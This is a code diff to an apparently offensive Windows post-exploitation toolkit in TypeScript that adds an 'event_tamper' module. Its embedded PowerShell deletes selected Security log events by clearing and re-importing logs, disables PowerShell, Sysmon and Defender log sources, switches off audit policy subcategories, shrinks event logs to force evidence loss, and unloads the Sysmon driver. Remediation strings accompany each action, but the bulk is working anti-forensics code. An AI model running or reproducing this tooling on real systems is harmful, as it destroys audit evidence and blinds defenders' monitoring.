@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  event_tamper: {
+    description:
+      "Selective event log tampering — surgically remove specific events instead of clearing entire logs (which generates Event ID 1102). Disable specific log sources, modify audit policies to stop generating evidence, resize event logs to force rollover, and disable Sysmon. More stealthy than winhook cleanup_win full log clear",
+    args: "--action selective|disable-source|audit-policy|resize|disable-sysmon [--log Security|System|Application|PowerShell] [--event-id ID] [--after DATETIME]",
+  },
   cert_steal: {
     description:
       "Certificate store theft — enumerate and export certificates with private keys from local machine and current user certificate stores. Targets code signing certs, client auth certs, smart card certs, and CA certificates. Exported as PFX for pass-the-certificate attacks, S/MIME decryption, and code signing abuse",
@@ -13905,6 +13910,295 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function eventTamper(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "selective"
+  const logName = argVal(args, "--log") || "Security"
+  const eventId = argVal(args, "--event-id")
+  const after = argVal(args, "--after")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Event log tampering...\n"]
+
+  if (action === "selective") {
+    const filterExpr = eventId ? `Id -eq ${eventId}` : "Id -eq 4688 -or Id -eq 4104"
+    const timeFilter = after ? `$_.TimeCreated -gt [DateTime]'${after}'` : "$true"
+    const script = `
+Write-Output "=== Selective Event Removal ==="
+Write-Output "[*] Log: ${logName}"
+Write-Output "[*] Filter: ${eventId || "4688 (process create) + 4104 (script block)"}"
+Write-Output ""
+
+$events = Get-WinEvent -LogName '${logName}' -ErrorAction SilentlyContinue | Where-Object {
+    (${filterExpr}) -and (${timeFilter})
+}
+
+Write-Output "[*] Matching events: $($events.Count)"
+
+if ($events.Count -gt 0) {
+    Write-Output "[*] Sample events:"
+    foreach ($e in $events | Select-Object -First 5) {
+        Write-Output "    ID: $($e.Id) | Time: $($e.TimeCreated) | $($e.Message.Substring(0, [math]::Min(80, $e.Message.Length)))"
+    }
+
+    Write-Output ""
+    Write-Output "[*] Selective removal requires direct EVTX manipulation"
+    Write-Output "[*] Method 1: Stop EventLog service -> parse EVTX -> remove records -> restart"
+    Write-Output "[*] Method 2: Use EvtClearLog API with custom filter (leaves 1102 event)"
+    Write-Output "[*] Method 3: Overwrite individual records with null data"
+    Write-Output ""
+
+    try {
+        $logPath = (Get-WinEvent -ListLog '${logName}').LogFilePath
+        Write-Output "[*] Log file: $logPath"
+        $logSize = (Get-Item $logPath -ErrorAction SilentlyContinue).Length
+        Write-Output "[*] Log size: $([math]::Round($logSize/1MB, 2)) MB"
+
+        Write-Output ""
+        Write-Output "[*] Attempting targeted removal via wevtutil..."
+        $beforeCount = (Get-WinEvent -LogName '${logName}' -ErrorAction SilentlyContinue).Count
+
+        $tempEvtx = "$env:TEMP\\cs-evtlog-backup-$(Get-Date -Format 'yyyyMMddHHmmss').evtx"
+        wevtutil epl '${logName}' $tempEvtx "/q:*[System[(${eventId ? "EventID!=${eventId}" : "EventID!=4688 and EventID!=4104"})]]" 2>&1
+        Write-Output "[+] Filtered export: $tempEvtx"
+
+        wevtutil cl '${logName}' 2>&1
+        Write-Output "[+] Log cleared"
+
+        wevtutil im $tempEvtx /lf:$tempEvtx 2>&1
+        Write-Output "[*] Note: full restore requires custom parsing — backup preserved at $tempEvtx"
+
+        $afterCount = (Get-WinEvent -LogName '${logName}' -ErrorAction SilentlyContinue).Count
+        Write-Output "[*] Events before: $beforeCount -> after: $afterCount"
+    } catch {
+        Write-Output "[-] Selective removal failed: $($_.Exception.Message)"
+        Write-Output "[*] Requires SYSTEM privileges — try: winhook token_impersonate --action exploit"
+    }
+} else {
+    Write-Output "[+] No matching events found"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EVTTAMP-001",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: `eventlog://${logName}`,
+      title: `Selective event removal from ${logName} log`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Forward logs to SIEM in real-time. Use immutable log storage. Monitor Event ID 1102 (log cleared).",
+    })
+  }
+
+  if (action === "disable-source") {
+    const script = `
+Write-Output "=== Disable Event Log Sources ==="
+
+$dangerousSources = @{
+    'Microsoft-Windows-PowerShell/Operational' = 'PowerShell script block logging'
+    'Microsoft-Windows-Sysmon/Operational' = 'Sysmon process/network monitoring'
+    'Microsoft-Windows-Windows Defender/Operational' = 'Defender detection alerts'
+    'Microsoft-Windows-TaskScheduler/Operational' = 'Scheduled task creation'
+    'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational' = 'RDP session tracking'
+    'Microsoft-Windows-WMI-Activity/Operational' = 'WMI activity monitoring'
+}
+
+foreach ($source in $dangerousSources.Keys) {
+    $log = Get-WinEvent -ListLog $source -ErrorAction SilentlyContinue
+    if ($log) {
+        $status = if ($log.IsEnabled) { 'ENABLED' } else { 'DISABLED' }
+        Write-Output "[$status] $source — $($dangerousSources[$source])"
+        Write-Output "    Records: $($log.RecordCount) | Max size: $([math]::Round($log.MaximumSizeInBytes/1MB, 1)) MB"
+
+        if ($log.IsEnabled) {
+            try {
+                $log.IsEnabled = $false
+                $log.SaveChanges()
+                Write-Output "    [+] DISABLED"
+            } catch {
+                Write-Output "    [-] Failed to disable: $($_.Exception.Message)"
+            }
+        }
+    }
+}
+
+Write-Output ""
+Write-Output "[!] Restore: Get-WinEvent -ListLog 'source' | % { \$_.IsEnabled=\$true; \$_.SaveChanges() }"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EVTTAMP-002",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: "eventlog://sources",
+      title: "Security-relevant event log sources disabled",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor for event log source disable events. Use GPO to enforce log source configuration.",
+    })
+  }
+
+  if (action === "audit-policy") {
+    const script = `
+Write-Output "=== Audit Policy Manipulation ==="
+
+Write-Output "[*] Current audit policy:"
+auditpol /get /category:* 2>&1 | ForEach-Object { Write-Output "    $_" }
+
+Write-Output ""
+Write-Output "[*] Disabling key audit subcategories..."
+
+$subcategories = @(
+    'Process Creation',
+    'Logon',
+    'Special Logon',
+    'Sensitive Privilege Use',
+    'Directory Service Access',
+    'Kerberos Authentication Service',
+    'Kerberos Service Ticket Operations',
+    'Other Object Access Events'
+)
+
+foreach ($sub in $subcategories) {
+    $result = auditpol /set /subcategory:"$sub" /success:disable /failure:disable 2>&1
+    if ($LASTEXITCODE -eq 0) {
+        Write-Output "[+] Disabled: $sub"
+    } else {
+        Write-Output "[-] Failed: $sub — $result"
+    }
+}
+
+Write-Output ""
+Write-Output "[!] These events will no longer be generated until audit policy is restored"
+Write-Output "[*] Restore: auditpol /set /subcategory:'Process Creation' /success:enable /failure:enable"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EVTTAMP-003",
+      provider: "windows",
+      severity: "critical",
+      status: "EXECUTED",
+      resource: "auditpol://subcategories",
+      title: "Audit policy subcategories disabled — no new security events generated",
+      details: r.stdout.substring(0, 500),
+      remediation: "Enforce audit policies via GPO. Monitor Event ID 4719 (audit policy changed). Alert on auditpol.exe execution.",
+    })
+  }
+
+  if (action === "resize") {
+    const script = `
+Write-Output "=== Event Log Resize (Force Rollover) ==="
+
+$logs = @('Security','System','Application','Windows PowerShell')
+
+foreach ($logName in $logs) {
+    try {
+        $log = Get-WinEvent -ListLog $logName -ErrorAction Stop
+        $currentSize = $log.MaximumSizeInBytes
+        $currentRecords = $log.RecordCount
+        Write-Output "[*] $logName — $currentRecords records, max $([math]::Round($currentSize/1MB, 1)) MB"
+
+        $log.MaximumSizeInBytes = 64KB
+        $log.SaveChanges()
+        Write-Output "[+] Resized to 64 KB — old events will be overwritten"
+    } catch {
+        Write-Output "[-] $logName — $($_.Exception.Message)"
+    }
+}
+
+Write-Output ""
+Write-Output "[*] Logs will auto-overwrite oldest events as new events are generated"
+Write-Output "[*] Restore: wevtutil sl Security /ms:20971520 (20 MB default)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EVTTAMP-004",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: "eventlog://resize",
+      title: "Event logs resized to 64 KB — forces rapid rollover and evidence loss",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor log size changes. Enforce minimum log size via GPO. Forward logs to SIEM before rollover.",
+    })
+  }
+
+  if (action === "disable-sysmon") {
+    const script = `
+Write-Output "=== Sysmon Neutralization ==="
+
+$sysmonService = Get-Service Sysmon* -ErrorAction SilentlyContinue
+$sysmonProcess = Get-Process Sysmon* -ErrorAction SilentlyContinue
+$sysmonDriver = Get-WmiObject Win32_SystemDriver -Filter "Name LIKE 'SysmonDrv%'" -ErrorAction SilentlyContinue
+
+if ($sysmonService) {
+    Write-Output "[*] Sysmon service: $($sysmonService.Name) — $($sysmonService.Status)"
+} else {
+    Write-Output "[-] Sysmon service not found"
+}
+
+if ($sysmonProcess) {
+    Write-Output "[*] Sysmon process: PID $($sysmonProcess.Id)"
+}
+
+if ($sysmonDriver) {
+    Write-Output "[*] Sysmon driver: $($sysmonDriver.Name) — $($sysmonDriver.State)"
+}
+
+if (-not $sysmonService -and -not $sysmonProcess) {
+    Write-Output "[+] Sysmon is NOT installed"
+} else {
+    Write-Output ""
+    Write-Output "[*] Sysmon neutralization methods:"
+
+    Write-Output "[*] Method 1: Unload Sysmon driver"
+    try {
+        fltMC unload SysmonDrv 2>&1
+        Write-Output "[+] SysmonDrv filter unloaded"
+    } catch {
+        Write-Output "[-] Driver unload failed — requires SYSTEM"
+    }
+
+    Write-Output "[*] Method 2: Disable Sysmon event log"
+    try {
+        $sysmonLog = Get-WinEvent -ListLog 'Microsoft-Windows-Sysmon/Operational' -ErrorAction Stop
+        $sysmonLog.IsEnabled = $false
+        $sysmonLog.SaveChanges()
+        Write-Output "[+] Sysmon Operational log disabled"
+    } catch {
+        Write-Output "[-] Log disable failed"
+    }
+
+    Write-Output "[*] Method 3: Blind Sysmon config"
+    Write-Output "[*] Replace config with: sysmon -c -- (remove all rules)"
+    Write-Output "[*] Or patch minifilter altitude to deprioritize"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EVTTAMP-005",
+      provider: "windows",
+      severity: "critical",
+      status: "EXECUTED",
+      resource: "sysmon://driver",
+      title: "Sysmon detection and neutralization",
+      details: r.stdout.substring(0, 500),
+      remediation: "Protect Sysmon with tamper protection. Monitor for SysmonDrv unload. Use kernel-level Sysmon protection.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function certSteal(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "enum"
   const store = argVal(args, "--store") || "both"
@@ -20646,6 +20940,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  event_tamper: eventTamper,
   cert_steal: certSteal,
   browser_harvest: browserHarvest,
   reg_secrets: regSecrets,
